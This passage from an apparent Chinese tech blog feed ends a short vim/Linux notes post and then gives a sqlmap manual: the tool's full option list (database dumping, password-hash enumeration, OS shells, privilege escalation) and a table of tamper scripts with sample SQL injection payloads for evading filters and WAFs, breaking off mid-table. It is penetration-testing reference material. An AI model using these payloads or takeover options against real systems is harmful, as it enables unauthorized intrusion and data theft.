Ctrl+w   进行两个文件上下窗口切换（需要再按上下方向键）  </p><h2 id="其他常用命令"><a href="#其他常用命令" class="headerlink" title="其他常用命令"></a>其他常用命令</h2><p>：e!   重新加载文件，再查看日志文件的时候可以用，不断在变化的文件。</p><p> shift+j  将下一行拼接到上一行</p><p> u  撤销</p><p>：set nu   显示行号 </p><p>：n   跳转到第n行（按回车才会跳）</p><p>Ctrl+g 会在显示屏的底部显示文件名字和总的行数，当前光标的位置行号</p><p>~  这个将会改变光标位置的字符的大小写</p><p>Ctrl +a 跳到当前命令行里的首位，比如 cd /etc/profile ,这个是一个文件，我想改成vi /etc/profile 就可以按 ctrl+a 光标就会移到cd位置，如果碰到比较长的命令，这个还是非常的实用的</p><p>ctrl+e 跳到当前命令行的末尾。和ctrl+a 相反</p><h1 id="Linux系统的启动过程"><a href="#Linux系统的启动过程" class="headerlink" title="Linux系统的启动过程"></a>Linux系统的启动过程</h1><h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><h3 id="进程相关ID"><a href="#进程相关ID" class="headerlink" title="进程相关ID"></a>进程相关ID</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">user 用户名</span><br><span class="line">uid 用户号</span><br><span class="line">pid 进程号</span><br><span class="line">ppid 父进程号</span><br><span class="line">size 内存大小, Kbytes字节.</span><br><span class="line">vsize 总虚拟内存大小, bytes字节(包含code+data+stack)</span><br><span class="line">share 总共享页数</span><br><span class="line">nice 进程优先级(缺省为0, 最大为-20)</span><br><span class="line">priority(pri) 内核调度优先级</span><br><span class="line">pmem 进程分享的物理内存数的百分比</span><br><span class="line">trs 程序执行代码驻留大小</span><br><span class="line">rss 进程使用的总物理内存数, Kbytes字节</span><br><span class="line">time 进程执行起到现在总的CPU暂用时间</span><br><span class="line"><span class="built_in">stat</span> 进程状态</span><br><span class="line">cmd(args) 执行命令的简单格式</span><br></pre></td></tr></table></figure><h3 id="进程操作"><a href="#进程操作" class="headerlink" title="进程操作"></a>进程操作</h3><p>命令后面加&amp;符号可以调入后台，fg [n]，从后台调入前台 ,bg从前台调入后台</p>]]></content>
      
      <categories>
          
          <category> Document </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqlmap用户手册及实战</title>
      <link href="/2018/08-14-sqlmap.html"/>
      <url>/2018/08-14-sqlmap.html</url>
      <content type="html"><![CDATA[<h1 id="sqlmap介绍"><a href="#sqlmap介绍" class="headerlink" title="sqlmap介绍"></a>sqlmap介绍</h1><p>sqlmap是一个开源的渗透测试工具，可以自动检测和利用SQL注入漏洞并接管数据库服务器。它配备了强大的检测引擎，为终极渗透测试仪提供了许多小众功能，以及从数据库指纹识别，从数据库获取数据到访问底层文件系统以及通过输出操作系统执行命令的各种开关。带连接。</p><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><pre><code>Usage: python sqlmap.py [options]Options:  -h, --help            Show basic help message and exit  -hh                   Show advanced help message and exit  --version             Show program's version number and exit  -v VERBOSE            Verbosity level: 0-6 (default 1)  Target:    At least one of these options has to be provided to define the    target(s)    -d DIRECT           Connection string for direct database connection    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file    -x SITEMAPURL       Parse target(s) from remote sitemap(.xml) file    -m BULKFILE         Scan multiple targets given in a textual file    -r REQUESTFILE      Load HTTP request from a file    -g GOOGLEDORK       Process Google dork results as target URLs    -c CONFIGFILE       Load options from a configuration INI file  Request:    These options can be used to specify how to connect to the target URL    --method=METHOD     Force usage of given HTTP method (e.g. PUT)    --data=DATA         Data string to be sent through POST    --param-del=PARA..  Character used for splitting parameter values    --cookie=COOKIE     HTTP Cookie header value    --cookie-del=COO..  Character used for splitting cookie values    --load-cookies=L..  File containing cookies in Netscape/wget format    --drop-set-cookie   Ignore Set-Cookie header from response    --user-agent=AGENT  HTTP User-Agent header value    --random-agent      Use randomly selected HTTP User-Agent header value    --host=HOST         HTTP Host header value    --referer=REFERER   HTTP Referer header value    -H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")    --headers=HEADERS   Extra headers (e.g. "Accept-Language: fr\nETag: 123")    --auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)    --auth-cred=AUTH..  HTTP authentication credentials (name:password)    --auth-file=AUTH..  HTTP authentication PEM cert/private key file    --ignore-code=IG..  Ignore HTTP error code (e.g. 401)    --ignore-proxy      Ignore system default proxy settings    --ignore-redirects  Ignore redirection attempts    --ignore-timeouts   Ignore connection timeouts    --proxy=PROXY       Use a proxy to connect to the target URL    --proxy-cred=PRO..  Proxy authentication credentials (name:password)    --proxy-file=PRO..  Load proxy list from a file    --tor               Use Tor anonymity network    --tor-port=TORPORT  Set Tor proxy port other than default    --tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))    --check-tor         Check to see if Tor is used properly    --delay=DELAY       Delay in seconds between each HTTP request    --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)    --retries=RETRIES   Retries when the connection timeouts (default 3)    --randomize=RPARAM  Randomly change value for given parameter(s)    --safe-url=SAFEURL  URL address to visit frequently during testing    --safe-post=SAFE..  POST data to send to a safe URL    --safe-req=SAFER..  Load safe HTTP request from a file    --safe-freq=SAFE..  Test requests between two visits to a given safe URL    --skip-urlencode    Skip URL encoding of payload data    --csrf-token=CSR..  Parameter used to hold anti-CSRF token    --csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token    --force-ssl         Force usage of SSL/HTTPS    --hpp               Use HTTP parameter pollution method    --eval=EVALCODE     Evaluate provided Python code before the request (e.g.                        "import hashlib;id2=hashlib.md5(id).hexdigest()")  Optimization:    These options can be used to optimize the performance of sqlmap    -o                  Turn on all optimization switches    --predict-output    Predict common queries output    --keep-alive        Use persistent HTTP(s) connections    --null-connection   Retrieve page length without actual HTTP response body    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)  Injection:    These options can be used to specify which parameters to test for,    provide custom injection payloads and optional tampering scripts    -p TESTPARAMETER    Testable parameter(s)    --skip=SKIP         Skip testing for given parameter(s)    --skip-static       Skip testing parameters that not appear to be dynamic    --param-exclude=..  Regexp to exclude parameters from testing (e.g. "ses")    --dbms=DBMS         Force back-end DBMS to this value    --dbms-cred=DBMS..  DBMS authentication credentials (user:password)    --os=OS             Force back-end DBMS operating system to this value    --invalid-bignum    Use big numbers for invalidating values    --invalid-logical   Use logical operations for invalidating values    --invalid-string    Use random strings for invalidating values    --no-cast           Turn off payload casting mechanism    --no-escape         Turn off string escaping mechanism    --prefix=PREFIX     Injection payload prefix string    --suffix=SUFFIX     Injection payload suffix string    --tamper=TAMPER     Use given script(s) for tampering injection data  Detection:    These options can be used to customize the detection phase    --level=LEVEL       Level of tests to perform (1-5, default 1)    --risk=RISK         Risk of tests to perform (1-3, default 1)    --string=STRING     String to match when query is evaluated to True    --not-string=NOT..  String to match when query is evaluated to False    --regexp=REGEXP     Regexp to match when query is evaluated to True    --code=CODE         HTTP code to match when query is evaluated to True    --text-only         Compare pages based only on the textual content    --titles            Compare pages based only on their titles  Techniques:    These options can be used to tweak testing of specific SQL injection    techniques    --technique=TECH    SQL injection techniques to use (default "BEUSTQ")    --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)    --union-cols=UCOLS  Range of columns to test for UNION query SQL injection    --union-char=UCHAR  Character to use for bruteforcing number of columns    --union-from=UFROM  Table to use in FROM part of UNION query SQL injection    --dns-domain=DNS..  Domain name used for DNS exfiltration attack    --second-order=S..  Resulting page URL searched for second-order response  Fingerprint:    -f, --fingerprint   Perform an extensive DBMS version fingerprint  Enumeration:    These options can be used to enumerate the back-end database    management system information, structure and data contained in the    tables. Moreover you can run your own SQL statements    -a, --all           Retrieve everything    -b, --banner        Retrieve DBMS banner    --current-user      Retrieve DBMS current user    --current-db        Retrieve DBMS current database    --hostname          Retrieve DBMS server hostname    --is-dba            Detect if the DBMS current user is DBA    --users             Enumerate DBMS users    --passwords         Enumerate DBMS users password hashes    --privileges        Enumerate DBMS users privileges    --roles             Enumerate DBMS users roles    --dbs               Enumerate DBMS databases    --tables            Enumerate DBMS database tables    --columns           Enumerate DBMS database table columns    --schema            Enumerate DBMS schema    --count             Retrieve number of entries for table(s)    --dump              Dump DBMS database table entries    --dump-all          Dump all DBMS databases tables entries    --search            Search column(s), table(s) and/or database name(s)    --comments          Retrieve DBMS comments    -D DB               DBMS database to enumerate    -T TBL              DBMS database table(s) to enumerate    -C COL              DBMS database table column(s) to enumerate    -X EXCLUDECOL       DBMS database table column(s) to not enumerate    -U USER             DBMS user to enumerate    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables    --pivot-column=P..  Pivot column name    --where=DUMPWHERE   Use WHERE condition while table dumping    --start=LIMITSTART  First dump table entry to retrieve    --stop=LIMITSTOP    Last dump table entry to retrieve    --first=FIRSTCHAR   First query output word character to retrieve    --last=LASTCHAR     Last query output word character to retrieve    --sql-query=QUERY   SQL statement to be executed    --sql-shell         Prompt for an interactive SQL shell    --sql-file=SQLFILE  Execute SQL statements from given file(s)  Brute force:    These options can be used to run brute force checks    --common-tables     Check existence of common tables    --common-columns    Check existence of common columns  User-defined function injection:    These options can be used to create custom user-defined functions    --udf-inject        Inject custom user-defined functions    --shared-lib=SHLIB  Local path of the shared library  File system access:    These options can be used to access the back-end database management    system underlying file system    --file-read=RFILE   Read a file from the back-end DBMS file system    --file-write=WFILE  Write a local file on the back-end DBMS file system    --file-dest=DFILE   Back-end DBMS absolute filepath to write to  Operating system access:    These options can be used to access the back-end database management    system underlying operating system    --os-cmd=OSCMD      Execute an operating system command    --os-shell          Prompt for an interactive operating system shell    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC    --os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC    --os-bof            Stored procedure buffer overflow exploitation    --priv-esc          Database process user privilege escalation    --msf-path=MSFPATH  Local path where Metasploit Framework is installed    --tmp-path=TMPPATH  Remote absolute path of temporary files directory  Windows registry access:    These options can be used to access the back-end database management    system Windows registry    --reg-read          Read a Windows registry key value    --reg-add           Write a Windows registry key value data    --reg-del           Delete a Windows registry key value    --reg-key=REGKEY    Windows registry key    --reg-value=REGVAL  Windows registry key value    --reg-data=REGDATA  Windows registry key value data    --reg-type=REGTYPE  Windows registry key value type  General:    These options can be used to set some general working parameters    -s SESSIONFILE      Load session from a stored (.sqlite) file    -t TRAFFICFILE      Log all HTTP traffic into a textual file    --batch             Never ask for user input, use the default behaviour    --binary-fields=..  Result fields having binary values (e.g. "digest")    --check-internet    Check Internet connection before assessing the target    --crawl=CRAWLDEPTH  Crawl the website starting from the target URL    --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. "logout")    --csv-del=CSVDEL    Delimiting character used in CSV output (default ",")    --charset=CHARSET   Blind SQL injection charset (e.g. "0123456789abcdef")    --dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)    --encoding=ENCOD..  Character encoding used for data retrieval (e.g. GBK)    --eta               Display for each output the estimated time of arrival    --flush-session     Flush session files for current target    --forms             Parse and test forms on target URL    --fresh-queries     Ignore query results stored in session file    --har=HARFILE       Log all HTTP traffic into a HAR file    --hex               Use DBMS hex function(s) for data retrieval    --output-dir=OUT..  Custom output directory path    --parse-errors      Parse and display DBMS error messages from responses    --save=SAVECONFIG   Save options to a configuration INI file    --scope=SCOPE       Regexp to filter targets from provided proxy log    --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)    --test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)    --update            Update sqlmap  Miscellaneous:    -z MNEMONICS        Use short mnemonics (e.g. "flu,bat,ban,tec=EU")    --alert=ALERT       Run host OS command(s) when SQL injection is found    --answers=ANSWERS   Set question answers (e.g. "quit=N,follow=N")    --beep              Beep on question and/or when SQL injection is found    --cleanup           Clean up the DBMS from sqlmap specific UDF and tables    --dependencies      Check for missing (non-core) sqlmap dependencies    --disable-coloring  Disable console output coloring    --gpage=GOOGLEPAGE  Use Google dork results from specified page number    --identify-waf      Make a thorough testing for a WAF/IPS/IDS protection    --mobile            Imitate smartphone through HTTP User-Agent header    --offline           Work in offline mode (only use session data)    --purge-output      Safely remove all content from output directory    --skip-waf          Skip heuristic detection of WAF/IPS/IDS protection    --smart             Conduct thorough tests only if positive heuristic(s)    --sqlmap-shell      Prompt for an interactive sqlmap shell    --tmp-dir=TMPDIR    Local directory for storing temporary files    --web-root=WEBROOT  Web server document root directory (e.g. "/var/www")    --wizard            Simple wizard interface for beginner users</code></pre><h1 id="Output-verbosity-输出冗长"><a href="#Output-verbosity-输出冗长" class="headerlink" title="Output verbosity(输出冗长)"></a>Output verbosity(输出冗长)</h1><p>选项: <code>-v</code></p><p>此选项可用于设置输出消息的详细级别。存在 <strong>seven</strong> 级别的冗长。默认级别为<strong>1</strong> 其中显示信息，警告，错误，关键消息和Python回溯（如果发生）。</p><ul><li><strong>0</strong>: 仅显示Python回溯，错误和关键消息。</li><li><strong>1</strong>: 还显示信息和警告消息。</li><li><strong>2</strong>: 显示调试消息。</li><li><strong>3</strong>: 显示注入的有效负载。</li><li><strong>4</strong>: 还显示HTTP请求。</li><li><strong>5</strong>: 还显示HTTP响应的标题。</li><li><strong>6</strong>: 还显示HTTP响应的页面内容。</li></ul><p>一个合理的冗长程度，以进一步了解sqlmap在底层的作用是 <strong>2</strong>, 级，主要用于检测阶段和接管功能。而如果您想查看工具发送的SQL有效负载，则第<strong>3</strong>级是您的最佳选择。当您向开发人员提供潜在的错误报告时，也建议使用此级别，确保使用选项生成的流量日志文件与标准输出一起发送<code>-t</code>.。为了进一步调试潜在的错误或意外行为，我们建议您将详细程度设置为 <strong>4</strong>级或更高级别。应该注意的是，还可以通过使用此选项的较短版本来设置详细程度，其中字母数量 <code>v</code> 内的规定开关（而不是选择）确定的详细级别（例如<code>-v</code> ，而不是code>-v 2, <code>-vv</code> 代替<code>-v 3</code>, <code>-vvv</code> 而不是<code>-v 4</code>, etc.)</p># tamper脚本分类说明<div><table style="font-family:Arial;font-size:14px;border-collapse:collapse;"><tbody><tr><td class="et2" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:bottom;width:77.25pt;">支持的数据库</td><td class="et3" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">编号</td><td class="et3" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:166.5pt;">脚本名称</td><td class="et2" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:bottom;width:210.75pt;">作用</td><td class="et2" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:bottom;width:251.25pt;">实现方式</td></tr><tr><td class="et4" rowspan="8" style="font-size:20pt;text-align:center;vertical-align:middle;width:77.25pt;">all</td><td class="et5" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">1</td><td class="et6" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">apostrophemask.py</td><td class="et7" style="font-size:11pt;vertical-align:middle;width:210.75pt;">用utf8代替引号</td><td class="et8" style="font-size:11pt;vertical-align:middle;width:251.25pt;">("1 AND '1'='1") <br>'1 AND %EF%BC%871%EF%BC%87=%EF%BC%871' </td></tr><tr><td class="et5" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">2</td><td class="et9" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">base64encode.py </td><td class="et10" style="font-size:11pt;vertical-align:middle;width:210.75pt;">用base64编码替换</td><td class="et8" style="font-size:11pt;vertical-align:middle;width:251.25pt;">("1' AND SLEEP(5)#")<br>'MScgQU5EIFNMRUVQKDUpIw=='</td></tr><tr><td class="et5" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">3</td><td class="et9" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">multiplespaces.py</td><td class="et10" style="font-size:11pt;vertical-align:middle;width:210.75pt;">围绕SQL关键字添加多个空格</td><td class="et8" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('1 UNION SELECT foobar')<br>'1    UNION     SELECT   foobar'</td></tr><tr><td class="et5" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">4</td><td class="et9" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">space2plus.py</td><td class="et10" style="font-size:11pt;vertical-align:middle;width:210.75pt;">用+替换空格</td><td class="et8" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('SELECT id FROM users')<br>'SELECT+id+FROM+users'</td></tr><tr><td class="et5" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">5</td><td class="et9" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">nonrecursivereplacement.py</td><td class="et7" style="font-size:11pt;vertical-align:middle;width:210.75pt;">双重查询语句。取代predefined SQL关键字with表示 <br>suitable for替代（例如  .replace（“SELECT”、”")） filters</td><td class="et8" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('1 UNION SELECT 2--')<br>'1 UNIOUNIONN SELESELECTCT 2--'</td></tr><tr><td class="et5" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">6</td><td class="et9" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">space2randomblank.py</td><td class="et7" style="font-size:11pt;vertical-align:middle;width:210.75pt;">代替空格字符（“”）从一个随机的空<br>白字符可选字符的有效集</td><td class="et8" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('SELECT id FROM users')<br>'SELECT%0Did%0DFROM%0Ausers'</td></tr><tr><td class="et5" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">7</td><td class="et9" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">unionalltounion.py</td><td class="et10" style="font-size:11pt;vertical-align:middle;width:210.75pt;">替换UNION ALL SELECT UNION SELECT</td><td class="et8" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('-1 UNION ALL SELECT')<br>'-1 UNION SELECT'</td></tr><tr><td class="et5" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">8</td><td class="et9" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">securesphere.py</td><td class="et10" style="font-size:11pt;vertical-align:middle;width:210.75pt;">追加特制的字符串</td><td class="et8" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('1 AND 1=1')<br>"1 AND 1=1 and '0having'='0having'"</td></tr><tr><td class="et4" rowspan="11" style="font-size:20pt;text-align:center;vertical-align:middle;width:77.25pt;">mssql</td><td class="et11" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">1</td><td class="et12" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">space2hash.py</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:210.75pt;">绕过过滤‘=’ 替换空格字符（”），（’ – ‘）后跟一个破折号注释，一个随机字符串和一个新行（’ n’）</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:251.25pt;"><br>'1 AND 9227=9227' <br>'1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227' </td></tr><tr><td class="et11" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">2</td><td class="et14" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">equaltolike.py</td><td class="et15" style="font-size:11pt;vertical-align:middle;width:210.75pt;">like 代替等号</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:251.25pt;"><br>* Input: SELECT * FROM users WHERE id=1 <br>2 * Output: SELECT * FROM users WHERE id LIKE 1 </td></tr><tr><td class="et11" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">3</td><td class="et12" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">space2mssqlblank.py(mssql)</td><td class="et16" style="font-size:11pt;vertical-align:bottom;width:210.75pt;">空格替换为其它空符号</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:251.25pt;">Input: SELECT id FROM users<br>Output: SELECT%08id%02FROM%0Fusers</td></tr><tr><td class="et11" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">4</td><td class="et12" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">space2mssqlhash.py</td><td class="et16" style="font-size:11pt;vertical-align:bottom;width:210.75pt;">替换空格</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('1 AND 9227=9227')<br>'1%23%0AAND%23%0A9227=9227'</td></tr><tr><td class="et11" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">5</td><td class="et12" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">between.py</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:210.75pt;">用between替换大于号（&gt;）</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('1 AND A &gt; B--')<br>'1 AND A NOT BETWEEN 0 AND B--'</td></tr><tr><td class="et11" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">6</td><td class="et12" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">percentage.py</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:210.75pt;">asp允许每个字符前面添加一个%号</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT FIELD FROM TABLE<br>* Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td></tr><tr><td class="et11" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">7</td><td class="et12" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">sp_password.py</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:210.75pt;">追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('1 AND 9227=9227-- ')<br>'1 AND 9227=9227-- sp_password'</td></tr><tr><td class="et11" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">8</td><td class="et12" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">charencode.py</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:210.75pt;">url编码</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT FIELD FROM%20TABLE<br>* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td></tr><tr><td class="et11" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">9</td><td class="et12" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">randomcase.py</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:210.75pt;">随机大小写</td><td class="et17" style="font-size:10.5pt;vertical-align:middle;width:251.25pt;">* Input: INSERT<br>* Output: InsERt</td></tr><tr><td class="et11" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">10</td><td class="et12" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">charunicodeencode.py</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:210.75pt;">字符串 unicode 编码</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT FIELD%20FROM TABLE<br>* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td></tr><tr><td class="et11" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">11</td><td class="et12" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">space2comment.py</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:210.75pt;">Replaces space character (‘ ‘) with comments ‘/* */’</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT id FROM users<br>* Output: SELECT//id//FROM/* */users</td></tr><tr><td class="et18" rowspan="18" style="font-size:20pt;text-align:center;vertical-align:middle;width:77.25pt;">mysql &gt;= 5.1.13</td><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">1</td><td class="et20" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">equaltolike.py</td><td class="et21" style="font-size:11pt;vertical-align:middle;width:210.75pt;">like 代替等号</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;"><br>* Input: SELECT * FROM users WHERE id=1 <br>2 * Output: SELECT * FROM users WHERE id LIKE 1 </td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">2</td><td class="et23" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">greatest.py</td><td class="et24" style="font-size:10.5pt;vertical-align:middle;width:210.75pt;"><span class="font23">绕过过滤</span><span class="font24">’&gt;’ ,</span><span class="font23">用</span><span class="font24">GREATEST</span><span class="font23">替换大于号。</span></td><td class="et25" style="font-size:10.5pt;vertical-align:middle;width:251.25pt;">('1 AND A &gt; B')<br>'1 AND GREATEST(A,B+1)=A'</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">3</td><td class="et23" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">apostrophenullencode.py</td><td class="et24" style="font-size:10.5pt;vertical-align:middle;width:210.75pt;">绕过过滤双引号，替换字符和双引号。</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">tamper("1 AND '1'='1")<br><br>'1 AND %00%271%00%27=%00%271'</td></tr><tr><td class="et26" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">4</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">ifnull2ifisnull.py</td><td class="et21" style="font-size:11pt;vertical-align:middle;width:210.75pt;">绕过对 IFNULL 过滤。<br>替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</td><td class="et25" style="font-size:10.5pt;vertical-align:middle;width:251.25pt;">('IFNULL(1, 2)')<br>'IF(ISNULL(1),2,1)'</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">5</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">space2mssqlhash.py</td><td class="et21" style="font-size:11pt;vertical-align:middle;width:210.75pt;">替换空格</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('1 AND 9227=9227')<br>'1%23%0AAND%23%0A9227=9227'</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">6</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">modsecurityversioned.py</td><td class="et24" style="font-size:10.5pt;vertical-align:middle;width:210.75pt;">过滤空格，包含完整的查询版本注释</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('1 AND 2&gt;1--')<br>'1 /*!30874AND 2&gt;1*/--'</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">7</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">space2mysqlblank.py</td><td class="et21" style="font-size:11pt;vertical-align:middle;width:210.75pt;">空格替换其它空白符号(mysql)</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">Input: SELECT id FROM users<br>Output: SELECT%0Bid%0BFROM%A0users</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">8</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">between.py</td><td class="et24" style="font-size:10.5pt;vertical-align:middle;width:210.75pt;">用between替换大于号（&gt;）</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('1 AND A &gt; B--')<br>'1 AND A NOT BETWEEN 0 AND B--'</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">9</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">modsecurityzeroversioned.py</td><td class="et21" style="font-size:11pt;vertical-align:middle;width:210.75pt;">包含了完整的查询与零版本注释</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('1 AND 2&gt;1--')<br>'1 /*!00000AND 2&gt;1*/--'</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">10</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">space2mysqldash.py</td><td class="et24" style="font-size:10.5pt;vertical-align:middle;width:210.75pt;">替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('1 AND 9227=9227')<br>'1--%0AAND--%0A9227=9227'</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">11</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">bluecoat.py</td><td class="et21" 